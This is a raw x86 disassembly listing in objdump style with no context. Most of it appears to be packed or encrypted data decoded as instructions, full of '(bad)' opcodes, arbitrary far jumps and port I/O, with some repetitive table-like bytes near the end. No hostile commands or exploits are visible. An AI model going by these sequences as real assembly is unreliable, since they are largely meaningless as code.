  41cce6:	fimul  DWORD PTR [ecx-0x6b]
  41cce9:	jbe    0x41cce8
  41cceb:	sbb    al,BYTE PTR [edi]
  41cced:	pop    ss
  41ccee:	mov    esp,0xc7c0f29c
  41ccf3:	lds    ebx,FWORD PTR [ebp-0x5755d3ca]
  41ccf9:	js     0x41cccd
  41ccfb:	mov    ebp,0xa067919a
  41cd00:	addr16 cdq 
  41cd02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd03:	pop    edi
  41cd04:	sbb    BYTE PTR [edi+ebp*2],ch
  41cd07:	sbb    BYTE PTR [esi-0x2326af1b],bl
  41cd0d:	mov    WORD PTR [edx+0x6f2ccdf3],?
  41cd13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd14:	fcmove st,st(0)
  41cd16:	adc    edi,esi
  41cd18:	pop    ebp
  41cd19:	or     ah,cl
  41cd1b:	mov    ds:0x563295cd,eax
  41cd20:	leave  
  41cd21:	dec    edi
  41cd22:	js     0x41ccf7
  41cd24:	fucomi st,st(3)
  41cd26:	or     ah,bl
  41cd28:	das    
  41cd29:	ja     0x41cd8b
  41cd2b:	call   0x8c3b:0x6b79c2a1
  41cd32:	ins    BYTE PTR es:[edi],dx
  41cd33:	mov    dh,0x3d
  41cd35:	ficom  WORD PTR [edx+0x4e]
  41cd38:	clc    
  41cd39:	(bad)  
  41cd3a:	fcmovb st,st(2)
  41cd3c:	inc    ebp
  41cd3d:	jmp    0xb667:0x2f185156
  41cd44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd46:	push   edi
  41cd47:	mov    ebp,0xb7c7fd53
  41cd4c:	mov    ds,WORD PTR [ecx]
  41cd4e:	jmp    0xd0:0xf3fbc645
  41cd55:	or     BYTE PTR [esi-0x54],ch
  41cd58:	pop    ecx
  41cd59:	cmp    BYTE PTR [ecx+0x83207fa],al
  41cd5f:	dec    eax
  41cd60:	ficomp DWORD PTR [eax-0x2fdf17e8]
  41cd66:	sub    eax,0x7fe43318
  41cd6b:	pop    ebx
  41cd6c:	add    ah,BYTE PTR [edi]
  41cd6e:	scas   al,BYTE PTR es:[edi]
  41cd6f:	jle    0x41cd33
  41cd71:	xchg   ecx,eax
  41cd72:	jge    0x41cd24
  41cd74:	xchg   ecx,eax
  41cd75:	in     al,dx
  41cd76:	pop    edx
  41cd77:	idiv   eax
  41cd79:	nop
  41cd7a:	pop    eax
  41cd7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd7c:	sbb    bl,BYTE PTR [ecx]
  41cd7e:	mov    bl,0xcf
  41cd80:	sub    DWORD PTR [ebx+edx*1],eax
  41cd83:	ins    DWORD PTR es:[edi],dx
  41cd84:	nop
  41cd85:	push   esi
  41cd86:	push   0x2f
  41cd88:	sub    ecx,ebp
	...
  41cd92:	add    BYTE PTR [eax],al
  41cd94:	push   edx
  41cd95:	xor    al,0x40
  41cd97:	gs data16 jne 0x41ce12
  41cd9b:	aaa    
  41cd9c:	push   0xb86a4e09
  41cda1:	jno    0x41cd3c
  41cda3:	inc    edx
  41cda4:	ret    
  41cda5:	mov    DWORD PTR [ecx],eax
  41cda7:	add    BYTE PTR [esi-0x72000000],ch
  41cdad:	sti    
  41cdae:	sbb    dl,ah
  41cdb0:	jmp    0x35e61c9e
  41cdb5:	xor    eax,0x615a319e
  41cdba:	iret   
  41cdbb:	and    DWORD PTR [ebx+0x7],eax
  41cdbe:	enter  0xd9,0xaa
  41cdc2:	jb     0x41cde5
  41cdc4:	push   cs
  41cdc5:	xchg   ecx,eax
  41cdc6:	jmp    0xfb0d:0x14b4442d
  41cdcd:	out    0x12,eax
  41cdcf:	push   ecx
  41cdd0:	mov    esi,0x2d430a48
  41cdd5:	mov    edi,0x2a89777d
  41cdda:	mov    eax,ds:0x5f17f502
  41cddf:	icebp  
  41cde0:	js     0x41cd78
  41cde2:	pushf  
  41cde3:	not    BYTE PTR [ebx+0x3f]
  41cde6:	add    DWORD PTR [ebx+ebx*8],ebp
  41cde9:	push   0xd1f9036d
  41cdee:	jbe    0x41ce3a
  41cdf0:	pop    ds
  41cdf1:	pop    ebx
  41cdf2:	aas    
  41cdf3:	std    
  41cdf4:	mov    edi,0x8e8189ef
  41cdf9:	add    cl,dl
  41cdfb:	(bad)  
  41cdfc:	mov    al,0xab
  41cdfe:	(bad)  
  41cdff:	mov    ds:0x3e1c45cd,eax
  41ce04:	add    al,0x38
  41ce06:	leave  
  41ce07:	stos   DWORD PTR es:[edi],eax
  41ce08:	(bad)  
  41ce09:	lock xchg BYTE PTR [esi+0x1426db5],cl
  41ce10:	mov    cl,0xa4
  41ce12:	stos   BYTE PTR es:[edi],al
  41ce13:	xor    al,0xc8
  41ce15:	and    al,0xde
  41ce17:	repz sbb dh,BYTE PTR [ebx-0x25e76cba]
  41ce1e:	add    eax,0xc144de22
  41ce23:	test   BYTE PTR [edi+0x33f274b],ah
  41ce29:	pop    ebp
  41ce2a:	out    0x12,eax
  41ce2c:	or     DWORD PTR [edi-0x7997fd61],ebx
  41ce32:	add    edi,DWORD PTR [edi]
  41ce34:	jge    0x41ce2e
  41ce36:	in     al,dx
  41ce37:	add    al,0x6d
  41ce39:	jge    0x41cdfa
  41ce3b:	pop    es
  41ce3c:	sti    
  41ce3d:	jmp    0x41ce4e
  41ce3f:	aad    0xcc
  41ce41:	pushf  
  41ce42:	jae    0x41ce00
  41ce44:	mov    esi,cs
  41ce46:	pop    edi
  41ce47:	aad    0xa0
  41ce49:	xor    al,0xb8
  41ce4b:	loopne 0x41cec0
  41ce4d:	mov    esi,0xb755721e
  41ce52:	popa   
  41ce53:	fucomip st,st(4)
  41ce55:	inc    eax
  41ce56:	inc    ebx
  41ce57:	push   ebx
  41ce58:	(bad)  
	...
  41ce62:	add    BYTE PTR [eax],al
  41ce64:	adc    bh,BYTE PTR [edx-0x19073928]
  41ce6a:	push   ds
  41ce6b:	(bad)  
  41ce6c:	adc    bl,dh
  41ce6e:	cwde   
  41ce6f:	out    dx,al
  41ce70:	stos   BYTE PTR es:[edi],al
  41ce71:	stc    
  41ce72:	mov    bl,0xf6
  41ce74:	adc    DWORD PTR [ebx+0xae0001],ebp
  41ce7a:	add    BYTE PTR [eax],al
  41ce7c:	loop   0x41ce53
  41ce7e:	jne    0x41ce93
  41ce80:	add    al,0xda
  41ce82:	cmp    esp,0xcdf5f874
  41ce88:	adc    DWORD PTR [edi+0x345cb431],0xffffff97
  41ce8f:	mov    al,0x12
  41ce91:	xchg   esi,eax
  41ce92:	jae    0x41ceaa
  41ce94:	mov    al,ds:0xdf1cb103
  41ce99:	sbb    BYTE PTR [esi],bl
  41ce9b:	mov    ds:0x12fbbaba,eax
  41cea0:	pop    edi
  41cea1:	fst    DWORD PTR [ebx]
  41cea3:	neg    BYTE PTR [edx]
  41cea5:	fwait
  41cea6:	repz popa 
  41cea8:	sbb    eax,0x213ccde9
  41cead:	rol    ebp,cl
  41ceaf:	out    0x4,eax
  41ceb1:	scas   eax,DWORD PTR es:[edi]
  41ceb2:	mov    ch,0xf3
  41ceb4:	pop    esi
  41ceb5:	out    0x83,al
  41ceb7:	int    0xd2
  41ceb9:	sar    al,0x99
  41cebc:	lods   eax,DWORD PTR ds:[esi]
  41cebd:	daa    
  41cebe:	pop    ds
  41cebf:	js     0x41cf14
  41cec1:	xor    BYTE PTR [esi],cl
  41cec3:	cld    
  41cec4:	call   0x11ac8346
  41cec9:	or     eax,0xad3886f
  41cece:	repz cld 
  41ced0:	popa   
  41ced1:	mov    ds:0x1374cc53,eax
  41ced6:	rcr    DWORD PTR [esi],1
  41ced8:	dec    esi
  41ced9:	loop   0x41ceed
  41cedb:	mov    dh,al
  41cedd:	imul   DWORD PTR [ebx-0x30]
  41cee0:	sub    DWORD PTR ds:0xbdfe2ee0,edi
  41cee6:	dec    esp
  41cee7:	push   es
  41cee8:	out    dx,al
  41cee9:	sub    BYTE PTR [eax+0x5b],0x96
  41ceed:	(bad)  
  41ceee:	jb     0x41ce93
  41cef0:	inc    esi
  41cef1:	push   cs
  41cef2:	mov    cl,0x6d
  41cef4:	push   eax
  41cef5:	loop   0x41ce9d
  41cef7:	inc    edx
  41cef8:	xchg   ebx,eax
  41cef9:	mov    esp,0xd10c6f63
  41cefe:	aad    0xc7
  41cf00:	enter  0x5a7b,0xe1
  41cf04:	pop    ebx
  41cf05:	sbb    eax,ebx
  41cf07:	arpl   WORD PTR [edx],dx
  41cf09:	sub    cl,BYTE PTR [edx+0x5d]
  41cf0c:	das    
  41cf0d:	scas   eax,DWORD PTR es:[edi]
  41cf0e:	mov    ebx,0x3255e1ce
  41cf13:	mov    al,BYTE PTR [ebx]
  41cf15:	xor    esi,DWORD PTR [esi]
  41cf17:	jo     0x41cee1
  41cf19:	fsub   st,st(3)
  41cf1b:	jp     0x41cef0
  41cf1d:	outs   dx,BYTE PTR ds:[esi]
  41cf1e:	xchg   esi,eax
  41cf1f:	or     edi,DWORD PTR [edx+ecx*4-0x78]
  41cf23:	icebp  
  41cf24:	lahf   
  41cf25:	xchg   ecx,eax
  41cf26:	jo     0x41cf03
  41cf28:	push   ss
  41cf29:	les    eax,FWORD PTR [eax]
	...
  41cf33:	add    BYTE PTR [ecx+0x46],cl
  41cf36:	sub    BYTE PTR [eax],dh
  41cf38:	das    
  41cf39:	jle    0x41cf94
  41cf3b:	jg     0x41cf03
  41cf3d:	imul   esi,eax,0xffffffd5
  41cf40:	sar    edi,0xb3
  41cf43:	scas   al,BYTE PTR es:[edi]
  41cf44:	mov    edi,0xae0001ab
  41cf49:	add    BYTE PTR [eax],al
  41cf4b:	add    bh,ch
  41cf4d:	xor    al,0xe7
  41cf4f:	out    dx,eax
  41cf50:	inc    ebp
  41cf51:	(bad)  
  41cf52:	sbb    al,BYTE PTR [eax]
  41cf54:	lea    edi,[ebx+0x77810c14]
  41cf5a:	cdq    
  41cf5b:	pop    ds
  41cf5c:	stc    
  41cf5d:	sub    eax,0xbb353aa8
  41cf62:	mov    ?,eax
  41cf64:	daa    
  41cf65:	sbb    DWORD PTR [eax],ebx
  41cf67:	inc    edi
  41cf68:	pop    esp
  41cf69:	and    eax,0x9467628a
  41cf6e:	mov    ebx,0x21244e94
  41cf73:	dec    ebp
  41cf74:	pop    ss
  41cf75:	inc    eax
  41cf76:	into   
  41cf77:	aas    
  41cf78:	mov    eax,ds:0x1caca873
  41cf7d:	mov    ecx,0x6b918915
  41cf82:	in     eax,0x3c
  41cf84:	inc    edx
  41cf85:	dec    ecx
  41cf86:	jge    0x41cf27
  41cf88:	ins    BYTE PTR es:[edi],dx
  41cf89:	repz loopne 0x41cf6b
  41cf8c:	int    0x67
  41cf8e:	(bad)  
  41cf8f:	lock sbb al,0x26
  41cf92:	jmp    0x9ebdc303
  41cf97:	sbb    eax,0x804a600a
  41cf9c:	dec    edx
  41cf9d:	sub    bl,0x8
  41cfa0:	je     0x41cfd4
  41cfa2:	jb     0x41cfec
  41cfa4:	jle    0x41cf8d
  41cfa6:	jmp    0xf9d732fd
  41cfab:	std    
  41cfac:	outs   dx,BYTE PTR ds:[esi]
  41cfad:	out    0xae,eax
  41cfaf:	fisubr WORD PTR [ebx+0x1]
  41cfb2:	js     0x41cf5f
  41cfb4:	adc    eax,0xa981ba85
  41cfb9:	cmp    esi,esp
  41cfbb:	adc    BYTE PTR [ecx+0x45eccc78],ch
  41cfc1:	adc    ch,BYTE PTR [ecx-0x3d]
  41cfc4:	cmp    eax,0x18ee36cc
  41cfc9:	(bad)  
  41cfca:	jge    0x41cf97
  41cfcc:	fnsave [ebx+0x59]
  41cfcf:	das    
  41cfd0:	or     BYTE PTR [ebx+0x55a21ea5],bl
  41cfd6:	pushaw 
  41cfd8:	jge    0x41cf7b
  41cfda:	pop    ds
  41cfdb:	dec    edi
  41cfdc:	sbb    al,0x25
  41cfde:	push   edx
  41cfdf:	outs   dx,BYTE PTR ds:[esi]
  41cfe0:	ins    DWORD PTR es:[edi],dx
  41cfe1:	bound  eax,QWORD PTR [ebp-0x60]
  41cfe4:	pop    ecx
  41cfe5:	cmp    al,0x47
  41cfe7:	jg     0x41cfe6
  41cfe9:	pop    edx
  41cfea:	dec    edx
  41cfeb:	stos   DWORD PTR es:[edi],eax
  41cfec:	pop    ds
  41cfed:	bound  edi,QWORD PTR [edx+0x73]
  41cff0:	mov    es,esp
  41cff2:	mov    ch,0xfe
  41cff4:	inc    eax
  41cff5:	mov    ah,0x9e
  41cff7:	arpl   WORD PTR [esi],ax
  41cff9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  41d002:	add    BYTE PTR [eax],al
  41d004:	addr16 (bad) 
  41d006:	and    dh,dh
  41d008:	mov    eax,ds:0xe7d7f7f6
  41d00d:	mov    eax,0xe445da72
  41d012:	mov    bh,cl
  41d014:	ins    DWORD PTR es:[edi],dx
  41d015:	lods   al,BYTE PTR ds:[esi]
  41d016:	add    DWORD PTR [eax],eax
  41d018:	scas   al,BYTE PTR es:[edi]
  41d019:	add    BYTE PTR [eax],al
  41d01b:	add    BYTE PTR [esi+0x65882b51],bh
  41d021:	xor    ebx,DWORD PTR [edi+esi*8]
  41d024:	call   0x7d7609bf
  41d029:	mov    ds:0x10b7b2f9,eax
  41d02e:	or     ebp,esp
  41d030:	ins    BYTE PTR es:[edi],dx
  41d031:	fdivr  st(7),st
  41d033:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d034:	push   edi
  41d035:	out    dx,al
  41d036:	pop    es
  41d037:	fisttp QWORD PTR [edx+0x44]
  41d03a:	addr16 jo 0x41d066
  41d03d:	dec    esi
  41d03e:	ss mov dl,0xc9
  41d041:	sub    dl,ah
  41d043:	xchg   ebp,eax
  41d044:	stc    
  41d045:	(bad)  
  41d046:	mov    ebp,0xa548902c
  41d04b:	mov    dh,0xeb
  41d04d:	lds    esp,FWORD PTR [edx-0x5b]
  41d050:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d051:	loopne 0x41d049
  41d053:	ins    BYTE PTR es:[edi],dx
  41d054:	gs push es
  41d056:	out    0x82,eax
  41d058:	dec    ecx
  41d059:	dec    eax
  41d05a:	pop    esi
  41d05b:	pop    esp
  41d05c:	pop    ebx
  41d05d:	aaa    
  41d05e:	add    BYTE PTR [esi+ecx*1],ch
  41d061:	call   0xef93:0x98ad54ce
  41d068:	or     cl,BYTE PTR [ebx+0xe2b0d07]
  41d06e:	in     al,0xf1
  41d070:	shl    DWORD PTR [edi-0x4c],1
  41d073:	fisttp WORD PTR [ebp+edx*8-0x7b]
  41d077:	mov    BYTE PTR [esi],bl
  41d079:	and    al,0xf9
  41d07b:	pushf  
  41d07c:	jae    0x41d022
  41d07e:	add    ebp,edi
  41d080:	dec    edi
  41d081:	pop    ss
  41d082:	mov    ds:0x2fdbb6cb,eax
  41d087:	inc    eax
  41d088:	or     eax,0xcc8bfc18
  41d08d:	mov    ecx,0xe0780477
  41d092:	pop    edi
  41d093:	in     al,dx
  41d094:	jecxz  0x41d030
  41d096:	ss push ebp
  41d098:	sbb    BYTE PTR [edi-0x44],0x6a
  41d09c:	xor    BYTE PTR cs:[ebx-0x2b],bh
  41d0a0:	pop    ebx
  41d0a1:	test   ecx,edi
  41d0a3:	mov    BYTE PTR [edx+0x74],bh
  41d0a6:	add    eax,0xb3b62a00
  41d0ab:	in     eax,0xb8
  41d0ad:	adc    dl,0x90
  41d0b0:	dec    ebx
  41d0b1:	xor    BYTE PTR [eax],dh
  41d0b3:	pop    edi
  41d0b4:	dec    eax
  41d0b5:	jecxz  0x41d087
  41d0b7:	das    
  41d0b8:	push   ss
  41d0b9:	gs push eax
  41d0bb:	ins    BYTE PTR es:[edi],dx
  41d0bc:	inc    eax
  41d0bd:	mov    ecx,0x55d9faa4
  41d0c2:	mov    dl,0x7c
  41d0c4:	sbb    DWORD PTR [esi+edx*2+0x32385d],esi
	...
  41d0d3:	add    bl,al
  41d0d5:	or     eax,0xefee66a6
  41d0da:	ret    
  41d0db:	lods   eax,DWORD PTR ds:[esi]
  41d0dc:	sub    al,0xb8
  41d0de:	mov    ds:0x7d895447,eax
  41d0e3:	retf   0xad1b
  41d0e6:	add    DWORD PTR [eax],eax
  41d0e8:	scas   al,BYTE PTR es:[edi]
  41d0e9:	add    BYTE PTR [eax],al
  41d0eb:	add    BYTE PTR [edx-0x3d],bl
  41d0ee:	mov    esi,0x6bc90918
  41d0f3:	mov    ebx,0xe471ae8c
  41d0f8:	sbb    esi,edx
  41d0fa:	push   ecx
  41d0fb:	dec    esp
  41d0fc:	xchg   ebx,eax
  41d0fd:	pop    ds
  41d0fe:	xlat   BYTE PTR ds:[ebx]
  41d0ff:	pop    ecx
  41d100:	cli    
  41d101:	pop    eax
  41d102:	mov    DWORD PTR [edi+eiz*8-0x5eb2baae],esi
  41d109:	xchg   esp,eax
  41d10a:	int3   
  41d10b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d10c:	loope  0x41d102
  41d10e:	fild   WORD PTR [edx]
  41d110:	idiv   dh
  41d112:	push   0xfffffff5
  41d114:	int3   
  41d115:	mov    WORD PTR [edx-0x6a8764a3],es
  41d11b:	lock je 0x41d115
  41d11e:	mov    bh,0x4b
  41d120:	cmp    eax,0x48e32ae9
  41d125:	push   ebx
  41d126:	stos   DWORD PTR es:[edi],eax
  41d127:	into   
  41d128:	out    0xc2,eax
  41d12a:	fsubr  QWORD PTR [ebx+0x72]
  41d12d:	lea    esi,[ebp-0x5f]
  41d130:	mov    eax,0xaed426e2
  41d135:	clc    
  41d136:	rcr    BYTE PTR [eax+0x2c],cl
  41d139:	inc    edi
  41d13a:	push   eax
  41d13b:	dec    ebp
  41d13c:	sub    al,0x86
  41d13e:	sbb    eax,0x356314fe
  41d143:	imul   ebp,DWORD PTR [edx+eax*4+0x5f],0xcb86b9f4
  41d14b:	imul   edi,DWORD PTR [edi],0x37516c37
  41d151:	xor    DWORD PTR [esi+0x76da88e],esp
  41d157:	push   edi
  41d158:	in     eax,0x5a
  41d15a:	add    DWORD PTR [edi-0x3bb8e8cc],eax
  41d160:	rcr    cl,cl
  41d162:	xor    al,0x7
  41d164:	pop    ebp
  41d165:	scas   al,BYTE PTR es:[edi]
  41d166:	loope  0x41d1d3
  41d168:	push   0x36038bda
  41d16d:	inc    edi
  41d16e:	push   0x7dcfdc82
  41d173:	rcl    DWORD PTR [esi],0xb2
  41d176:	std    
  41d177:	fimul  WORD PTR [edi-0x39]
  41d17a:	fldenv [ebx]
  41d17c:	in     al,0x96
  41d17e:	cmp    esp,DWORD PTR [ecx+0x42]
  41d181:	jne    0x41d1ae
  41d183:	js     0x41d177
  41d185:	sbb    eax,0x62844c85
  41d18a:	sbb    DWORD PTR [ecx+esi*4],esi
  41d18d:	lods   eax,DWORD PTR ds:[esi]
  41d18e:	dec    edx
  41d18f:	mov    eax,0x1d8d2753
  41d194:	popf   
  41d195:	sbb    al,0x98
  41d197:	shl    DWORD PTR [ebx],0xcf
	...
  41d1a2:	add    BYTE PTR [eax],al
  41d1a4:	fld    st(2)
  41d1a6:	add    eax,0xddcf1f49
  41d1ab:	ror    al,cl
  41d1ad:	outs   dx,DWORD PTR ds:[esi]
  41d1ae:	clc    
  41d1af:	rcr    BYTE PTR [ecx-0x36a54958],cl
  41d1b5:	lods   eax,DWORD PTR ds:[esi]
  41d1b6:	add    DWORD PTR [eax],eax
  41d1b8:	cwde   
  41d1b9:	add    BYTE PTR [eax],al
  41d1bb:	add    BYTE PTR [edi+edx*4],ah
  41d1be:	hlt    
  41d1bf:	loopne 0x41d1b8
  41d1c1:	add    BYTE PTR [esi-0x54172a2b],ch
  41d1c7:	pushf  
  41d1c8:	mov    edx,0x44649b73
  41d1cd:	adc    cl,dh
  41d1cf:	imul   edi,DWORD PTR [esi-0x79],0x49
  41d1d3:	outs   dx,BYTE PTR ds:[esi]
  41d1d4:	cmp    ch,BYTE PTR [ebx-0xe6ddd81]
  41d1da:	xchg   esp,eax
  41d1db:	iret   
  41d1dc:	cmp    BYTE PTR [ebx+eiz*4+0x6affe4aa],ch
  41d1e3:	sbb    DWORD PTR [edx],ecx
  41d1e5:	movsx  edx,WORD PTR [ecx-0x18]
  41d1e9:	xor    bl,BYTE PTR [edx-0x52bd1db5]
  41d1ef:	test   BYTE PTR [eax+eax*1+0x5280d2c7],bl
  41d1f6:	nop
  41d1f7:	loopne 0x41d253
  41d1f9:	ins    BYTE PTR es:[edi],dx
  41d1fa:	out    dx,eax
  41d1fb:	in     al,0x46
  41d1fd:	ins    BYTE PTR es:[edi],dx
  41d1fe:	std    
  41d1ff:	(bad)  
  41d200:	jnp    0x41d251
  41d202:	ds dec ebx
  41d204:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d205:	loope  0x41d18e
  41d207:	(bad)  
  41d208:	push   ebp
  41d209:	and    dl,BYTE PTR [edi+0xa]
  41d20c:	aad    0xb6
  41d20e:	adc    bh,cl
  41d210:	call   0x2697bb24
  41d215:	push   ebp
  41d216:	retf   
  41d217:	ins    DWORD PTR es:[edi],dx
  41d218:	in     al,0xe
  41d21a:	and    esi,ebp
  41d21c:	mov    cs,WORD PTR [eax-0x40736973]
  41d222:	or     esp,DWORD PTR [esi+0x57]
  41d225:	and    BYTE PTR fs:[eax-0x106a0772],al
  41d22c:	inc    ecx
  41d22d:	test   eax,0xc90f0123
  41d232:	pop    esp
  41d233:	ret    
  41d234:	popf   
  41d235:	ss ss jmp 0x41d214
  41d239:	in     al,dx
  41d23a:	mov    eax,ds:0x11c04d70
  41d23f:	rcr    eax,1
  41d241:	ins    BYTE PTR es:[edi],dx
  41d242:	jns    0x41d2b1
  41d244:	push   edx
  41d245:	lea    edx,[ecx]
  41d247:	and    cl,BYTE PTR [ebp-0x4686ea4e]
  41d24d:	xchg   BYTE PTR [eax-0x34],ah
  41d250:	push   0xffffffd8
  41d252:	out    0x1,al
  41d254:	add    BYTE PTR [eax+0x42],ah
  41d257:	add    BYTE PTR [eax+eiz*2],al
  41d25a:	inc    edx
  41d25b:	add    BYTE PTR [eax],cl
  41d25d:	pusha  
  41d25e:	inc    edx
  41d25f:	add    BYTE PTR [eax+eiz*2],cl
  41d262:	inc    edx
  41d263:	add    BYTE PTR [eax],dl
  41d265:	pusha  
  41d266:	inc    edx
  41d267:	add    BYTE PTR [eax+eiz*2],dl
  41d26a:	inc    edx
  41d26b:	add    BYTE PTR [eax],bl
  41d26d:	pusha  
  41d26e:	inc    edx
  41d26f:	add    BYTE PTR [eax+eiz*2],bl
  41d272:	inc    edx
  41d273:	add    BYTE PTR [eax],al
  41d275:	jo     0x41d2b9
  41d277:	add    BYTE PTR [eax+esi*2],al
  41d27a:	inc    edx
  41d27b:	add    BYTE PTR [eax],cl
  41d27d:	jo     0x41d2c1
  41d27f:	add    BYTE PTR [eax+esi*2],cl
  41d282:	inc    edx
  41d283:	add    BYTE PTR [eax],dl
  41d285:	jo     0x41d2c9
  41d287:	add    BYTE PTR [eax+esi*2],dl
  41d28a:	inc    edx
  41d28b:	add    BYTE PTR [eax],bl
  41d28d:	jo     0x41d2d1
  41d28f:	add    BYTE PTR [eax+esi*2],bl
  41d292:	inc    edx
  41d293:	add    BYTE PTR [eax],al
  41d295:	add    BYTE PTR [edx+0x0],0x4
  41d299:	add    BYTE PTR [edx+0x0],0x8
  41d29d:	add    BYTE PTR [edx+0x0],0xc
  41d2a1:	add    BYTE PTR [edx+0x0],0x10
  41d2a5:	add    BYTE PTR [edx+0x0],0x14
  41d2a9:	add    BYTE PTR [edx+0x0],0x18
  41d2ad:	add    BYTE PTR [edx+0x0],0x1c
  41d2b1:	add    BYTE PTR [edx+0x0],0x78
  41d2b5:	data16 ins BYTE PTR es:[edi],dx
  41d2b7:	jp     0x41d310
  41d2b9:	jbe    0x41d302
  41d2bb:	ja     0x41d300
  41d2bd:	js     0x41d307
  41d2bf:	jno    0x41d311
  41d2c1:	arpl   WORD PTR [ebx+0x6f],dx
  41d2c4:	inc    edi
  41d2c5:	dec    esi
  41d2c6:	outs   dx,DWORD PTR ds:[esi]
  41d2c7:	pop    ecx
  41d2c8:	inc    edi
  41d2c9:	jb     0x41d312
  41d2cb:	jns    0x41d343
  41d2cd:	inc    ecx
  41d2ce:	pop    eax
  41d2cf:	dec    esp
  41d2d0:	add    BYTE PTR [eax],al
  41d2d2:	add    BYTE PTR [eax],al
  41d2d4:	pop    esp
  41d2d5:	(bad)  
  41d2d6:	inc    ecx
  41d2d7:	add    BYTE PTR [esi+edx*8+0x41],ah
  41d2db:	add    BYTE PTR [edx*8+0xbef0041],bl
  41d2e2:	mov    dl,0xe
  41d2e4:	jns    0x41d334
  41d2e6:	xor    BYTE PTR [esi-0x79],cl
  41d2e9:	dec    edi
  41d2ea:	cmp    eax,0x3e4faf4e
  41d2ef:	dec    esi
  41d2f0:	js     0x41d340
  41d2f2:	cmp    ecx,DWORD PTR [esi-0x64]
  41d2f5:	dec    edi
  41d2f6:	inc    esp
  41d2f7:	dec    esi
  41d2f8:	jae    0x41d348
  41d2fa:	inc    ecx
  41d2fb:	dec    esi
  41d2fc:	xor    BYTE PTR [esi+0x40],cl
  41d2ff:	dec    esi
  41d300:	pop    esp
  41d301:	pop    ebp
  41d302:	pop    edi
  41d303:	push   edx
  41d304:	cmp    DWORD PTR [esi+0x79],ecx
  41d307:	dec    esi
  41d308:	xor    BYTE PTR [esi-0x79],cl
  41d30b:	dec    edi
  41d30c:	cmp    eax,0x3e4faf4e
  41d311:	dec    esi
  41d312:	js     0x41d362
  41d314:	cmp    ecx,DWORD PTR [esi-0x64]
  41d317:	dec    edi
  41d318:	inc    esp
  41d319:	dec    esi
  41d31a:	mov    DWORD PTR [edi+0x41],ecx
  41d31d:	dec    esi
  41d31e:	xor    BYTE PTR [esi+0x40],cl
  41d321:	dec    esi
  41d322:	pop    esp
  41d323:	ins    DWORD PTR es:[edi],dx
  41d324:	pop    edi
  41d325:	bound  edi,QWORD PTR [ecx]
  41d327:	dec    esi
  41d328:	jns    0x41d378
  41d32a:	xor    BYTE PTR [esi-0x80],cl
  41d32d:	dec    edi
  41d32e:	cmp    eax,0x394e734e
  41d333:	dec    esi
  41d334:	mov    ds:0x304e3a4f,al
  41d339:	dec    esi
  41d33a:	inc    esi
  41d33b:	dec    esi
  41d33c:	pop    esp
  41d33d:	jge    0x41d39e
  41d33f:	jb     0x41d3b0
  41d341:	sub    BYTE PTR [esi-0x7d],0x7e
  41d345:	xchg   ebx,eax
  41d346:	jns    0x41d2d8
  41d348:	aas    
  41d349:	dec    esi
  41d34a:	test   BYTE PTR [edi+0x30],cl
  41d34d:	dec    esi
  41d34e:	test   BYTE PTR [edi+0x3c],cl
  41d351:	dec    esi
  41d352:	mov    ds:0x734e394f,al
  41d357:	dec    esi
  41d358:	inc    ebp
  41d359:	dec    esi
  41d35a:	xor    BYTE PTR [esi+0x44],cl
  41d35d:	dec    esi
  41d35e:	pop    esp
  41d35f:	lea    ebx,[edi-0x7e]
  41d362:	outs   dx,DWORD PTR ds:[esi]
  41d363:	xchg   edx,eax
  41d364:	outs   dx,BYTE PTR ds:[esi]
  41d365:	xchg   ebx,eax
  41d366:	jle    0x41d30b
  41d368:	jns    0x41d30a
  41d36a:	aas    
  41d36b:	dec    esi
  41d36c:	test   BYTE PTR [edi+0x30],cl
  41d36f:	dec    esi
  41d370:	test   BYTE PTR [edi+0x3c],cl
  41d373:	dec    esi
  41d374:	mov    ds:0x894e394f,al
  41d379:	dec    edi
  41d37a:	inc    ebp
  41d37b:	dec    esi
  41d37c:	xor    BYTE PTR [esi+0x44],cl
  41d37f:	dec    esi
  41d380:	pop    esp
  41d381:	popf   
  41d382:	pop    edi
  41d383:	xchg   edx,eax
  41d384:	outs   dx,DWORD PTR ds:[esi]
  41d385:	mov    ds:0xb37ea36e,al
  41d38a:	jns    0x41d33c
  41d38c:	aas    
  41d38d:	dec    esi
  41d38e:	mov    cs,WORD PTR [edi+0x30]
  41d391:	dec    esi
  41d392:	lods   al,BYTE PTR ds:[esi]
  41d393:	dec    edi
  41d394:	cmp    eax,0x394e734e
  41d399:	dec    esi
  41d39a:	mov    eax,ds:0x304e3a4f
  41d39f:	dec    esi
  41d3a0:	inc    esp
  41d3a1:	dec    esi
  41d3a2:	pop    esp
  41d3a3:	lods   eax,DWORD PTR ds:[esi]
  41d3a4:	pop    edi
  41d3a5:	mov    ds:0xb36eb26f,al
  41d3aa:	jle    0x41d36f
  41d3ac:	jns    0x41d36e
  41d3ae:	aas    
  41d3af:	dec    esi
  41d3b0:	mov    cs,WORD PTR [edi+0x30]
  41d3b3:	dec    esi
  41d3b4:	lods   al,BYTE PTR ds:[esi]
  41d3b5:	dec    edi
  41d3b6:	cmp    eax,0x394e7e4e
  41d3bb:	dec    esi
  41d3bc:	lahf   
  41d3bd:	dec    edi
  41d3be:	cmp    ecx,DWORD PTR [esi+0x30]
  41d3c1:	dec    esi
  41d3c2:	inc    ebp
  41d3c3:	dec    esi
  41d3c4:	pop    esp
  41d3c5:	mov    ebp,0xc26fb25f
  41d3ca:	outs   dx,BYTE PTR ds:[esi]
  41d3cb:	ret    
  41d3cc:	jle    0x41d3a1
  41d3ce:	jns    0x41d3a0
  41d3d0:	aas    
  41d3d1:	dec    esi
  41d3d2:	mov    cs,WORD PTR [edi+0x30]
  41d3d5:	dec    esi
  41d3d6:	lods   al,BYTE PTR ds:[esi]
  41d3d7:	dec    edi
  41d3d8:	cmp    eax,0x394f804e
  41d3dd:	dec    esi
  41d3de:	lods   al,BYTE PTR ds:[esi]
  41d3df:	dec    edi
